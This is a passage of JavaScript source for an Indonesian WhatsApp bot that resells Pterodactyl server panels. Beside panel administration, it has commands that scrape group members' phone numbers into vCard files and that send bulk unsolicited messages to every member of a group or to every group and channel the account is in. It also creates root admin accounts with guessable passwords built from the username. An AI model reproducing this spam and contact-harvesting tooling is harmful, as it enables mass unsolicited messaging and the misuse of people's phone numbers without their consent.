    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    
    return [];
  }
}

// Fungsi untuk mendapatkan semua server
async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

// Fungsi untuk menghapus server berdasarkan UUID
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}

// Fungsi untuk menghapus user berdasarkan ID
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}

// Fungsi utama untuk menghapus semua user & server yang bukan admin
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0

  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }

    const userID = user.attributes.id;
    const userEmail = user.attributes.email;

    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);

    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);

    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }

    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await m.reply(`Berhasil menghapus ${totalSrv} user & server panel yang bukan admin.`)
}

// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return m.reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel":
case "listserver": {
    if (!isOwner && !isReseller) {
        return m.reply(`Fitur ini hanya untuk di dalam grup reseller panel`);
    }

    try {
        const response = await fetch(`${domain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return m.reply("Tidak ada server panel!");
        }

        let messageText = `\n*Total server panel :* ${servers.length}\n`

        for (const server of servers) {
            const s = server.attributes;

            const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${capikey}`,
                },
            });

            const statusData = await resStatus.json();

            const ram = s.limits.memory === 0
                ? "Unlimited"
                : s.limits.memory >= 1024
                ? `${Math.floor(s.limits.memory / 1024)} GB`
                : `${s.limits.memory} MB`;

            const disk = s.limits.disk === 0
                ? "Unlimited"
                : s.limits.disk >= 1024
                ? `${Math.floor(s.limits.disk / 1024)} GB`
                : `${s.limits.disk} MB`;

            const cpu = s.limits.cpu === 0
                ? "Unlimited"
                : `${s.limits.cpu}%`;

            messageText += `
- ID : *${s.id}*
- Nama Server : *${s.name}*
- Ram : *${ram}*
- Disk : *${disk}*
- CPU : *${cpu}*
- Created : *${s.created_at.split("T")[0]}*\n`;
        }                  
        await m.reply(messageText)

    } catch (err) {
        console.error("Error listing panel servers:", err);
        m.reply("Terjadi kesalahan saat mengambil data server.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh : .cadmin xuu,62813xxxxx`)
    let nomor, usernem;
    const tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek;
        if (!users || !nom) return m.reply(`Contoh : .cadmin xuu,628XXX`)

        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat;
    }

    const onWa = await Xuu.onWhatsApp(nomor.split("@")[0]);
    if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = global.capital(args[0]);
    const password = `${username}001`;

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        const user = data.attributes;
        const orang = nomor;

        if (nomor !== m.chat) {
            await m.reply(`Berhasil membuat akun admin panel ✅\nData akun terkirim ke nomor ${nomor.split("@")[0]}`);
        }

        const teks = `
*Berikut detail akun admin panel 📦*

📡 Server ID: ${user.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}
*🌐* ${global.domain}

*Rules pembelian admin panel:*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
        `;

        await Xuu.sendMessage(orang, { text: teks }, { quoted: m });

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat membuat akun admin panel.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
    if (!isOwner) return m.reply(mess.owner);
    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });
        const rows = []
        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return m.reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
rows.push({
title: `${admin.attributes.first_name} || ID:${admin.attributes.id}`,
description: `Created At: ${admin.attributes.created_at.split("T")[0]}`, 
id: `.deladmin-response ${admin.attributes.id}`
})            
        });

        await Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Admin Panel Yang Ingin Dihapus\n`
}, { quoted: m })

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-response": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return 
    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        let targetAdmin = users.find(
            (e) => e.attributes.id == args[0] && e.attributes.root_admin === true
        );

        if (!targetAdmin) {
            return m.reply("Gagal menghapus akun!\nID user tidak ditemukan");
        }

        const idadmin = targetAdmin.attributes.id;
        const username = targetAdmin.attributes.username;

        const delRes = await fetch(`${domain}/api/application/users/${idadmin}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        if (!delRes.ok) {
            const errData = await delRes.json();
            return m.reply(`Gagal menghapus akun admin!\n${JSON.stringify(errData.errors[0], null, 2)}`);
        }

        await m.reply(`Berhasil Menghapus Admin Panel ✅\nNama User: ${global.capital(username)}`);

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat menghapus akun admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
    if (!isOwner) return m.reply(mess.owner);

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return m.reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
        });

        await m.reply(teks)

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addseller": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text && !m.quoted) return m.reply(`*contoh:* addseller 6283XXX`);

    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || Reseller.includes(input) || input === botNumber)
        return m.reply(`Nomor ${input2} sudah menjadi reseller!`);

    Reseller.push(input);
    fs.writeFileSync("./library/database/reseller.json", JSON.stringify(Reseller, null, 2));

    m.reply(`Berhasil menambah reseller ✅`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
    if (Reseller.length < 1) return m.reply("Tidak ada user reseller");

    let teks = ``;
    for (let i of Reseller) {
        const num = i.split("@")[0];
        teks += `\n* ${num}\n* *Tag :* @${num}\n`;
    }

    Xuu.sendMessage(m.chat, { text: teks, mentions: Reseller }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
    if (!isOwner) return m.reply(mess.owner);
    if (!m.quoted && !text) return m.reply(`*Contoh* .delseller 6283XXX`);

    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 == global.owner || input == botNumber)
        return m.reply(`Tidak bisa menghapus owner!`);

    if (!Reseller.includes(input))
        return m.reply(`Nomor ${input2} bukan reseller!`);

    Reseller.splice(Reseller.indexOf(input), 1);
    fs.writeFileSync("./library/database/reseller.json", JSON.stringify(Reseller, null, 2));

    m.reply(`Berhasil menghapus reseller ✅`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return reply(example("idgrupnya"))
let res = await Xuu.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ZarStore - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Xuu.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ZarStore - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Xuu.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return reply(example("pesannya"))
const meta = await Xuu.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await Xuu.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await Xuu.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await Xuu.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Xuu.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await Xuu.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await Xuu.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Xuu.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Xuu.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Xuu.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Xuu.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return reply("Tidak ada id ch didalam database")
if (!q) return reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await Xuu.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xuu.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isCreator) return Reply(mess.owner)
if (!q) return reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht"
const jid = m.chat
await reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
let ments = allgrup[i].participants.map(e => e.id)
let pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments } : { text: ttks, mentions: ments }
await Xuu.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teks dengan mengirim foto"))
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xuu.sendMessage(i, {
  footer: `© AXONIC V10`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }    
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await Xuu.sendMessage(m.chat, {
  footer: `© AXONIC V10`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return reply(example("dengan reply/kirim vidio"))
const vid = await Xuu.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await Xuu.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Xuu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Xuu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await Xuu.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await Xuu.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
Xuu.public = false
reply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./AXONIC.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getip": {
if (!isCreator) return
let t = await fetchJson('https://api64.ipify.org?format=json')
reply(`IP Panel : ${t.ip}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
Xuu.public = true
reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("teksnya bisa dengan kirim foto"))
let res
